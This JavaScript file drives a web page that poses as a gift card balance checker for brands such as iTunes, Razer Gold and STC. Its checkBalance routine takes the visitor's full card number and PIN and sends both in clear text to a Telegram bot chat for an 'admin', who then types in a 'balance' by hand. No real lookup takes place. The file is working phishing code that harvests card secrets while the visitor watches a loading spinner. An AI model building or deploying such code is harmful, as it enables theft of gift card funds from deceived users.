/* ================================================================
   app.js  — GiftCard Checker main logic
   Flow:
     1. User fills form → clicks Check Balance
     2. Send Telegram message to admin with card details + unique requestId
     3. Show loading spinner to user
     4. Poll localStorage every 3s for admin to have set the balance
        (admin panel writes balance keyed to requestId)
     5. When balance found → show result; if timeout → show error
   ================================================================ */

// ── Carousel (20 items, 5 per page, dot = page) ──────────────
const CAROUSEL_GAP = 10;
// 6 per page so the first “hero” set (iTunes, Razer, PUBG, STC, Mobily, Lebara) fits on one slide
const VISIBLE_COUNT = 6;

let carouselPage = 0; // 0 = cards 0–5 (first slide has iTunes…Lebara), then 6–11, …

function getCarouselCards() {
  if (typeof CAROUSEL_CARDS === 'undefined' || !Array.isArray(CAROUSEL_CARDS) || !CAROUSEL_CARDS.length) {
    return [];
  }
  return CAROUSEL_CARDS;
}

// Placeholder when image is missing (matches original first-five branding)
const CAROUSEL_PLACEHOLDER_HTML = {
  itunes: { bg: 'linear-gradient(135deg,#6d28d9,#ec4899)',  inner: '<span style="color:white;font-size:2.2rem">🎵</span>' },
  razer:  { bg: 'linear-gradient(135deg,#111,#222)',         inner: '<span style="color:#ffd700;font-weight:900;font-size:1.2rem;letter-spacing:1px;text-align:center">RAZER<br><span style="font-size:0.8rem;letter-spacing:3px">GOLD</span></span>' },
  pubg:   { bg: 'linear-gradient(135deg,#0f766e,#fbbf24)',  inner: '<span style="color:#fef3c7;font-weight:900;font-size:1rem;letter-spacing:1px">PUBG</span>' },
  stc:    { bg: 'linear-gradient(135deg,#4c1d95,#7c3aed)',  inner: '<span style="color:white;font-weight:900;font-size:1.8rem">stc</span>' },
  mobily: { bg: 'linear-gradient(135deg,#1d4ed8,#3b82f6)',  inner: '<span style="color:white;font-weight:700;font-size:1.2rem">Mobily</span>' },
  lebara: { bg: 'linear-gradient(135deg,#0369a1,#7dd3fc)',  inner: '<span style="color:white;font-weight:900;font-size:1.2rem">LEBARA</span>' },
  itunes_jpg: { bg: 'linear-gradient(135deg,#6d28d9,#ec4899)', inner: '<span style="color:white;font-size:2.2rem">🎵</span>' },
};

function buildCarouselDOM() {
  const track = document.getElementById('carouselTrack');
  const list  = getCarouselCards();
  if (!track || !list.length) return;

  track.innerHTML = list
    .map((c) => {
      const ph   = CAROUSEL_PLACEHOLDER_HTML[c.slug] || {
        bg: 'linear-gradient(135deg,#1e1b4b,#4c1d95)',
        inner: `<span style="color:#e9d5ff;font-weight:700;font-size:0.9rem;text-align:center;padding:0 4px;">${escapeHtml(c.label)}</span>`,
      };
      const inForm = document.querySelector(`#giftCardSelect option[value="${escapeAttr(c.slug)}"]`);
      const onClick = inForm
        ? `onclick="selectCard('${escapeAttr(c.slug)}')"`
        : '';
      return `
      <div class="carousel-item" data-slug="${escapeAttr(c.slug)}" ${onClick}>
        <div class="card-img-wrap">
          <img src="${escapeAttr(c.img)}" alt="${escapeHtml(c.label)}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/>
          <div class="card-placeholder" style="display:none;background:${ph.bg}">${ph.inner}</div>
        </div>
        <p>${escapeHtml(c.label)}</p>
      </div>`;
    })
    .join('');
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
function escapeAttr(s) {
  return String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

function getCarouselPageCount() {
  const items = document.querySelectorAll('#carouselTrack .carousel-item');
  const n     = items.length;
  if (n === 0) return 0;
  return Math.ceil(n / VISIBLE_COUNT);
}

function initCarousel() {
  buildCarouselDOM();

  const track    = document.getElementById('carouselTrack');
  const viewport = document.getElementById('carouselViewport');
  if (!track || !viewport) return;

  const items = () => track.querySelectorAll('.carousel-item');

  function setItemWidths() {
    const list = items();
    const total = list.length;
    if (total === 0) return;

    const vw   = viewport.clientWidth;
    const itemW = (vw - CAROUSEL_GAP * (VISIBLE_COUNT - 1)) / VISIBLE_COUNT;
    list.forEach((el) => { el.style.width = itemW + 'px'; });

    const maxPage = Math.max(0, getCarouselPageCount() - 1);
    if (carouselPage > maxPage) carouselPage = maxPage;
    applyTranslate(itemW, CAROUSEL_GAP, total);
    buildCarouselDotElements();
    updateDots();
    updateCarouselArrows();
  }

  function applyTranslate(itemW, gap, total) {
    const perPage  = VISIBLE_COUNT;
    const maxPage  = Math.max(0, Math.ceil(total / perPage) - 1);
    const safePage = Math.min(Math.max(0, carouselPage), maxPage);
    if (safePage !== carouselPage) carouselPage = safePage;
    const pageShift   = carouselPage * perPage * (itemW + gap);
    track.style.transform = `translateX(-${pageShift}px)`;
  }

  window._carouselResize = setItemWidths;
  window._applyTranslate = () => {
    const list   = items();
    const total  = list.length;
    if (total === 0) return;
    const vw     = viewport.clientWidth;
    const itemW  = (vw - CAROUSEL_GAP * (VISIBLE_COUNT - 1)) / VISIBLE_COUNT;
    applyTranslate(itemW, CAROUSEL_GAP, total);
    updateCarouselArrows();
  };

  setItemWidths();
  window.addEventListener('resize', setItemWidths);
}

function buildCarouselDotElements() {
  const host = document.getElementById('carouselDots');
  if (!host) return;
  const pages = getCarouselPageCount();
  host.innerHTML = '';
  for (let i = 0; i < pages; i++) {
    const span = document.createElement('span');
    span.className = 'dot' + (i === carouselPage ? ' active' : '');
    span.setAttribute('role', 'tab');
    span.setAttribute('aria-label', 'Page ' + (i + 1));
    span.addEventListener('click', () => {
      carouselPage = i;
      if (window._applyTranslate) window._applyTranslate();
      updateDots();
      updateCarouselArrows();
    });
    host.appendChild(span);
  }
}

function updateCarouselArrows() {
  const maxPage = Math.max(0, getCarouselPageCount() - 1);
  const prev = document.getElementById('carouselBtnPrev');
  const next = document.getElementById('carouselBtnNext');
  if (prev) {
    prev.disabled = carouselPage <= 0;
    prev.setAttribute('aria-disabled', carouselPage <= 0 ? 'true' : 'false');
  }
  if (next) {
    next.disabled = carouselPage >= maxPage;
    next.setAttribute('aria-disabled', carouselPage >= maxPage ? 'true' : 'false');
  }
}

function slideCarousel(dir) {
  const maxPage = Math.max(0, getCarouselPageCount() - 1);
  carouselPage = Math.max(0, Math.min(carouselPage + dir, maxPage));
  if (window._applyTranslate) window._applyTranslate();
  updateDots();
  updateCarouselArrows();
}

function updateDots() {
  const dotEls = document.querySelectorAll('#carouselDots .dot');
  dotEls.forEach((d, i) => d.classList.toggle('active', i === carouselPage));
}

function scrollToTopCarousel() {
  const el = document.getElementById('gift-card-carousel');
  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ── Select card from popular ──────────────────────────────────
function selectCard(value) {
  const sel = document.getElementById('giftCardSelect');
  sel.value = value;
  updateSelectIcon();
  document.querySelector('.checker-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateSelectIcon() {
  const sel = document.getElementById('giftCardSelect');
  const opt = sel.options[sel.selectedIndex];
  document.getElementById('selectIcon').textContent = opt.getAttribute('data-emoji') || '💳';
}

function clearResult() {
  document.getElementById('resultBox').style.display = 'none';
  document.getElementById('errorBox').style.display  = 'none';
  document.getElementById('loadingState').style.display = 'none';
}

// ── Shake helper ──────────────────────────────────────────────
function shakeEl(el) {
  el.style.animation = 'none';
  el.offsetHeight;
  el.style.animation = 'shake 0.4s ease';
  el.style.borderColor = '#ef4444';
  setTimeout(() => { el.style.borderColor = ''; el.style.animation = ''; }, 800);
}

// ── Generate unique request ID ────────────────────────────────
function genId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
}

// ── Card label map (all carousel slugs; form may only offer a subset) ─
const CARD_LABELS = (function () {
  const o = { razer: 'Razer Gold', itunes: 'iTunes', stc: 'STC', mobily: 'Mobily', lebara: 'Lebara' };
  if (typeof CAROUSEL_CARDS === 'undefined' || !Array.isArray(CAROUSEL_CARDS)) return o;
  CAROUSEL_CARDS.forEach((c) => { o[c.slug] = c.label; });
  return o;
})();

// ── Send Telegram message ─────────────────────────────────────
async function sendTelegram(text) {
  const token  = CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = CONFIG.TELEGRAM_CHAT_ID;

  if (!token || token === 'YOUR_BOT_TOKEN_HERE') {
    console.warn('Telegram not configured — skipping send.');
    return true; // allow flow to continue in dev mode
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
  });
  return res.ok;
}

// ── Main check balance flow ───────────────────────────────────
async function checkBalance() {
  const cardType  = document.getElementById('giftCardSelect').value;
  const cardNum   = document.getElementById('cardNumber').value.trim();
  const cardPin   = document.getElementById('cardPin').value.trim();

  // Validate
  if (!cardNum) { shakeEl(document.getElementById('cardNumber')); return; }
  if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }

  const requestId   = genId();
  const cardLabel   = CARD_LABELS[cardType] || cardType;
  const maskedNum   = cardNum.length > 4
    ? '*'.repeat(cardNum.length - 4) + cardNum.slice(-4)
    : cardNum;

  // ── UI: loading ──
  setLoading(true);
  clearResult();
  document.getElementById('loadingState').style.display = 'block';

  // ── Telegram message ──
  const tgMessage =
    `🎁 <b>New Gift Card Check</b>\n\n` +
    `🃏 <b>Card Type:</b> ${cardLabel}\n` +
    `🔢 <b>Redeem Number:</b> <code>${cardNum}</code>\n` +
    `🔑 <b>PIN / Code:</b> <code>${cardPin}</code>\n` +
    `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n` +
    `👉 Open admin panel and set the balance for this request ID.`;

  try {
    await sendTelegram(tgMessage);
  } catch (e) {
    console.error('Telegram send error:', e);
  }

  // ── Write request to localStorage so admin panel can see it ──
  try {
    const pending = JSON.parse(localStorage.getItem('gc_pending') || '[]');
    pending.unshift({
      id:       requestId,
      cardType: cardType,
      cardNum:  cardNum,
      cardPin:  cardPin,
      ts:       Date.now(),
      status:   'pending',
    });
    localStorage.setItem('gc_pending', JSON.stringify(pending));
  } catch(e) { console.error('localStorage error', e); }

  // ── Poll for admin response ──
  const start = Date.now();

  const poller = setInterval(() => {
    const stored = localStorage.getItem('balance_' + requestId);

    if (stored) {
      clearInterval(poller);
      const data = JSON.parse(stored);
      setLoading(false);
      document.getElementById('loadingState').style.display = 'none';

      if (data.balance) {
        showResult(data.balance, cardLabel, maskedNum);
      } else {
        showError(data.error || 'Card not found or expired.');
      }
      return;
    }

    if (Date.now() - start > CONFIG.POLL_TIMEOUT_MS) {
      clearInterval(poller);
      setLoading(false);
      document.getElementById('loadingState').style.display = 'none';
      showError('Request timed out. Admin did not respond. Please try again.');
    }
  }, CONFIG.POLL_INTERVAL_MS);
}

function setLoading(on) {
  const btn     = document.getElementById('checkBtn');
  const btnText = document.getElementById('btnText');
  const icon    = document.getElementById('btnIcon');
  const spinner = document.getElementById('btnSpinner');
  btn.disabled  = on;
  btnText.textContent = on ? 'Checking...' : 'Check Balance';
  icon.style.display    = on ? 'none' : 'inline';
  spinner.style.display = on ? 'inline' : 'none';
}

function showResult(balance, cardLabel, maskedNum) {
  document.getElementById('resultAmount').textContent = balance;
  document.getElementById('resultCard').textContent   = `${cardLabel} • ${maskedNum}`;
  document.getElementById('resultBox').style.display  = 'flex';
  document.getElementById('errorBox').style.display   = 'none';
  document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function showError(msg) {
  document.getElementById('errorMsg').textContent    = msg;
  document.getElementById('errorBox').style.display  = 'flex';
  document.getElementById('resultBox').style.display = 'none';
}

// ── Init ──────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initCarousel();
  updateSelectIcon();
});
